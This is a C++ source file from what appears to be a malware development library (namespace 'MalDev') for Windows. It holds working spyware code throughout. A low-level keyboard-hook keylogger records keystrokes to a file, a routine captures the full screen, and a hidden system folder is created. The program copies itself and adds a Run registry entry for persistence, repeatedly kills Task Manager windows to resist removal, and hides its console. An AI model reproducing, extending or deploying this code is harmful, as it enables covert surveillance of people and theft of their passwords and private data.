#include <Windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <atlsafe.h>
#include <thread>
#include "framework.h"
#include "pch.h"
#include "MalDev.h"
#include <stdio.h> 
#include <direct.h>
using namespace std;

namespace MalDev
{
	string KLogger::filename;
	HHOOK KLogger::hook;
	KBDLLHOOKSTRUCT KLogger::kbStruct;
	ofstream KLogger::file;
	int KLogger::Save(int key)
	{
		if (key == 1 || key == 2)
			return 0;
		HWND foreground = GetForegroundWindow();
		HKL keyboardLayout = nullptr;
		file.open(KLogger::filename, ios_base::app);
		if (key == VK_BACK)
			file << "[BACKSPACE]";
		else if (key == VK_RETURN)
			file << "\n";
		else if (key == VK_SPACE)
			file << " ";
		else if (key == VK_TAB)
			file << "[TAB]";
		else if (key == VK_SHIFT || key == VK_RSHIFT || key == VK_LSHIFT)
			file << "[SHIFT]";
		else if (key == VK_CONTROL || key == VK_RCONTROL || key == VK_LCONTROL)
			file << "[CTRL]";
		else if (key == VK_ESCAPE)
			file << "[ESC]";
		else if (key == VK_END)
			file << "[END]";
		else if (key == VK_HOME)
			file << "[HOME]";
		else if (key == VK_LEFT)
			file << "[LEF]";
		else if (key == VK_RIGHT)
			file << "[RIGHT]";
		else if (key == VK_UP)
			file << "[UP]";
		else if (key == VK_DOWN)
			file << "[DOWN]";
		else if (key == 190 || key == 110)
			file << ".";
		else if (key == 189 || key == 109)
			file << "-";
		else if (key == 20)
			file << "[CAPS]";
		else
		{
			char crrKey;
			bool lower = ((GetKeyState(VK_CAPITAL) & 0x001) != 0);
			if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0)
				lower = !lower;

			crrKey = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, keyboardLayout);

			if (!lower)
				crrKey = tolower(crrKey);

			file << char(crrKey);
		}
		file.close();
		return 0;
	}
	LRESULT CALLBACK KLogger::HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
	{
		if (nCode >= 0)
		{
			if (wParam == WM_KEYDOWN)
			{
				KLogger::kbStruct = *((KBDLLHOOKSTRUCT*)lParam);
				KLogger::Save(KLogger::kbStruct.vkCode);
			}
		}
		return CallNextHookEx(KLogger::hook, nCode, wParam, lParam);
	}
	bool KLogger::StartKeyLogger()
	{
		file.open(KLogger::filename, ios_base::app);
		if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, &KLogger::HookCallback, NULL, NULL)))
			return false;
		MSG msg;
		while (true)
			GetMessage(&msg, NULL, 0, 0);
	}
	void KLogger::SetFileName(string file)
	{
		KLogger::filename = file;
	}

	inline int Screen::GetFilePointer(HANDLE FileHandle)
	{
		return SetFilePointer(FileHandle, 0, 0, FILE_CURRENT);
	}
	bool Screen::SaveBMPFile(string filename, HBITMAP bitmap, HDC bitmapDC, int width, int height)
	{
		bool Success = false;
		HDC SurfDC = NULL;
		HBITMAP OffscrBmp = NULL;
		HDC OffscrDC = NULL;
		LPBITMAPINFO lpbi = NULL;
		LPVOID lpvBits = NULL;
		BITMAPFILEHEADER bmfh;
		HANDLE BmpFile = INVALID_HANDLE_VALUE;

		if ((OffscrBmp = CreateCompatibleBitmap(bitmapDC, width, height)) == NULL)
			return false;
		if ((OffscrDC = CreateCompatibleDC(bitmapDC)) == NULL)
			return false;

		HBITMAP OldBmp = (HBITMAP)SelectObject(OffscrDC, OffscrBmp);
		BitBlt(OffscrDC, 0, 0, width, height, bitmapDC, 0, 0, SRCCOPY);

		if ((lpbi = (LPBITMAPINFO)(new char[sizeof(BITMAPINFOHEADER) + 256 * sizeof(RGBQUAD)])) == NULL)
			return false;

		ZeroMemory(&lpbi->bmiHeader, sizeof(BITMAPINFOHEADER));
		lpbi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
		SelectObject(OffscrDC, OldBmp);

		if (!GetDIBits(OffscrDC, OffscrBmp, 0, height, NULL, lpbi, DIB_RGB_COLORS))
			return false;
		if ((lpvBits = new char[lpbi->bmiHeader.biSizeImage]) == NULL)
			return false;
		if (!GetDIBits(OffscrDC, OffscrBmp, 0, height, lpvBits, lpbi, DIB_RGB_COLORS))
			return false;
		if ((BmpFile = CreateFileA(filename.c_str(), GENERIC_WRITE, 0, NULL, CREATE_NEW,
			FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
			return false;

		DWORD Written;

		bmfh.bfType = 19778;
		bmfh.bfReserved1 = bmfh.bfReserved2 = 0;

		if (!WriteFile(BmpFile, &bmfh, sizeof(bmfh), &Written, NULL))
			return false;
		if (Written < sizeof(bmfh))
			return false;
		if (!WriteFile(BmpFile, &lpbi->bmiHeader, sizeof(BITMAPINFOHEADER), &Written, NULL))
			return false;
		if (Written < sizeof(BITMAPINFOHEADER))
			return false;

		int PalEntries;

		if (lpbi->bmiHeader.biCompression == BI_BITFIELDS)
			PalEntries = 3;
		else
			PalEntries = (lpbi->bmiHeader.biBitCount <= 8) ?
			(int)(1 << lpbi->bmiHeader.biBitCount) : 0;
		if (lpbi->bmiHeader.biClrUsed)
			PalEntries = lpbi->bmiHeader.biClrUsed;

		if (PalEntries) {
			if (!WriteFile(BmpFile, &lpbi->bmiColors, PalEntries * sizeof(RGBQUAD), &Written, NULL))
				return false;

			if (Written < PalEntries * sizeof(RGBQUAD))
				return false;
		}

		bmfh.bfOffBits = GetFilePointer(BmpFile);

		if (!WriteFile(BmpFile, lpvBits, lpbi->bmiHeader.biSizeImage, &Written, NULL))
			return false;
		if (Written < lpbi->bmiHeader.biSizeImage)
			return false;

		bmfh.bfSize = GetFilePointer(BmpFile);
		SetFilePointer(BmpFile, 0, 0, FILE_BEGIN);

		if (!WriteFile(BmpFile, &bmfh, sizeof(bmfh), &Written, NULL))
			return false;
		if (Written < sizeof(bmfh))
			return false;

		CloseHandle(BmpFile);
		return true;
	}
	bool Screen::ScreenCapture(int x, int y, int width, int height, string filename)
	{
		HDC hDc = CreateCompatibleDC(0);
		HBITMAP hBmp = CreateCompatibleBitmap(GetDC(0), width, height);
		SelectObject(hDc, hBmp);
		BitBlt(hDc, 0, 0, width, height, GetDC(0), x, y, SRCCOPY);
		bool ret = SaveBMPFile(filename, hBmp, hDc, width, height);
		DeleteObject(hBmp);
		return ret;
	}
	void Screen::ToScreen(string filename)
	{
		int x1, y1, x2, y2, w, h;
		x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
		y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
		x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
		y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
		w = x2 - x1;
		h = y2 - y1;
		ScreenCapture(0, 0, w, h, filename);
	}
	void Screen::SaveScreen(string workfolder)
	{
		srand(time(NULL));
		int r = rand();
		char ch[8];
		_itoa_s(r, ch, 10);
		string ct = ch;
		string bmp = ".bmp";
		ct = workfolder + ct + bmp;
		ToScreen(ct);
	}

	bool Tool::CreateWorkFolder(string workfolder, bool showfolder)
	{
		try
		{
			string FolderKeyLog = "mkdir " + workfolder;
			system(FolderKeyLog.c_str());

			if (!showfolder) string ShowFolder = "attrib +h +s +r " + workfolder;
			else string ShowFolder = "attrib -h -s -r " + workfolder;
			system(ShowFolder.c_str());
			
			return true;
		}
		catch (...) { return false; }
	}
	bool Tool::CopyExeFile(string OrigExe, string CopyExe)
	{
		try
		{
			ifstream open1;
			open1.open(CopyExe, ios_base::trunc);
			open1.close();
			ifstream OrigExe(OrigExe, ios::binary);
			ofstream CopyExe(CopyExe, ios::binary);
			CopyExe << OrigExe.rdbuf();
			return true;
		}
		catch (...) { return false; }
	}
	bool Tool::CopyToAutorun(LPCTSTR pathToAutoRun, LPCTSTR infoProc)
	{
		try
		{
			ATL::CRegKey AutoRun;
			AutoRun.Open(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
			AutoRun.SetStringValue(infoProc, pathToAutoRun);
			return true;
		}
		catch (...) { return false; }
	}
	void Tool::OfferTaskManager()
	{
		while (true)
		{
			HWND hwnd1 = FindWindowA("TaskManagerWindow", NULL);
			SendMessageA(hwnd1, WM_DESTROY, 0, 0);
			HWND hwnd2 = FindWindowA(NULL, "Task Manager Windows");
			SendMessageA(hwnd2, WM_DESTROY, 0, 0);
			Sleep(1000);
		}

	}
	void Tool::ShowConsole(bool show)
	{
		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), show);
	}
}
